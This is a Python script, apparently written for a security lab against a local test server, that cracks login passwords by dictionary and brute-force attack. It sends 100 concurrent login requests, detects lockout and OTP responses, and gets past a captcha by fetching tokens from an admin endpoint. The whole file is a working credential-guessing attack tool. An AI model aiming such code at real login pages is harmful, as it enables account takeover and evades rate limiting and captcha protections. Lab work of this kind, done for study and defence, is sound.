import itertools
import string
from time import time
import asyncio
import aiohttp
from bs4 import BeautifulSoup

GROUP_SEED = '496905569'
TARGET_URL = 'http://localhost:5000'
CONCURRENT_REQUESTS = 100

lock = None
captcha_event = None
cracked = {}
attempts_count = 0
queue = None
queue_shutdown = False

def dictionary_attack(users, wordlist_filepath, max_attempts, max_duration_min):
    producer_args = {
        'filepath' : wordlist_filepath
    }
    return asyncio.run(_attack(users, max_attempts, max_duration_min, producer_args))

def bruteforce_attack(users, digit, lowercase, uppercase, special, max_password_length, max_attempts, max_duration_min):
    charset = ""
    charset = charset + string.digits if digit else charset
    charset = charset + string.ascii_lowercase if lowercase else charset
    charset = charset + string.ascii_uppercase if uppercase else charset
    charset = charset + string.punctuation if special else charset
    producer_args = {
        'charset' : charset,
        'max_length' : max_password_length
    }
    return asyncio.run(_attack(users, max_attempts, max_duration_min, producer_args))

def stop_attack():
    global queue, queue_shutdown
    if queue is not None:
        queue.shutdown(immediate=True)
        queue_shutdown = True
    return cracked

async def _attack(users, max_attempts, max_duration_min, producer_args):
    global cracked, attempts_count, lock, queue, queue_shutdown, captcha_event
    cracked = {}
    attempts_count = 0
    queue = asyncio.Queue(maxsize=CONCURRENT_REQUESTS*10)
    queue_shutdown = False
    lock = asyncio.Lock()
    captcha_event = asyncio.Event()
    captcha_event.set()
    start = time()
    total_users = len(users)
    async with aiohttp.ClientSession() as session:
        producer = asyncio.create_task(_producer(queue, users, **producer_args))
        consumers = [asyncio.create_task(_consumer(session, queue, total_users, start, max_attempts, max_duration_min)) for _ in range(CONCURRENT_REQUESTS)]
        await producer
        await asyncio.gather(*consumers)
        await queue.join()
    return cracked

def _producer(queue, users, filepath=None, charset=None, max_length=0):
    if filepath is not None:
        return _producer_dict(queue, users, filepath)
    elif charset is not None and max_length > 0:
        return _producer_bf(queue, users, charset, max_length)

async def _producer_dict(queue, users, filepath):
    with open(filepath, 'r') as wordlist:
        for line in wordlist:
            password = line.strip()
            for username in users:
                try:
                    await queue.put([username, password])
                except asyncio.QueueShutDown:
                    return

async def _producer_bf(queue, users, charset, max_length):
    for length in range(1, max_length+1):
        for combination in itertools.product(charset, repeat=length):
            password = ''.join(combination)
            for username in users:
                try:
                    await queue.put([username, password])
                except asyncio.QueueShutDown:
                    return

async def _consumer(session, queue, total_users, start, max_attempts, max_duration_min):
    item_done = True
    item = None
    while not queue_shutdown:
        if item_done:
            try:
                item = await asyncio.wait_for(queue.get(), timeout=3.0)
            except asyncio.QueueShutDown:
                break
            except asyncio.TimeoutError:
                stop_attack()
                break
        username, password = item
        global cracked, attempts_count
        if username not in cracked:
            item_done = await _attempt_login(session, queue, username, password)
            if len(cracked) == total_users or attempts_count > max_attempts or time() - start > max_duration_min * 60:
                stop_attack()
                break
        else:
            queue.task_done()
    if not item_done:
        queue.task_done()

async def _attempt_login(session, queue, username, password):
    payload = {'username': username, 'password': password}
    await captcha_event.wait()
    while True:
        async with session.post(TARGET_URL + '/login', data=payload) as response:
            if response.status == 200:
                html = await response.text()
                return await _handle_html_response(session, queue, html, username, password)
    
async def _handle_html_response(session, queue, html, username, password):
    global cracked, attempts_count
    async with lock:
        attempts_count += 1
    soup = BeautifulSoup(html, 'html.parser')
    msg = soup.find(id="msg").get_text().strip()
    if msg == "logged in":
        async with lock:
            cracked[username] = password
        queue.task_done()
    elif msg == "locked" or msg == "wrong OTP":
        async with lock:
            if username not in cracked: cracked[username] = None
        queue.task_done()
    elif msg.startswith("locked for"):
        return False
    elif msg == "wrong token":
        await captcha_event.wait()
        captcha_event.clear()
        token = await _get_captcha_token(session)
        payload = {'username': username, 'password': password, 'captcha': token}
        while True:
            async with session.post(TARGET_URL + '/login', data=payload) as response:
                if response.status == 200:
                    html = await response.text()
                    captcha_event.set()
                    return await _handle_html_response(session, queue, html, username, password)
    else:
        queue.task_done()
    return True

async def _get_captcha_token(session):
    while True:
        async with session.get(TARGET_URL + '/admin/get_captcha_token?group_seed=' + GROUP_SEED) as response:
            if response.status == 200:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                token = soup.find(id="msg").get_text().strip()[7:]
                return token if token != "not found" else None
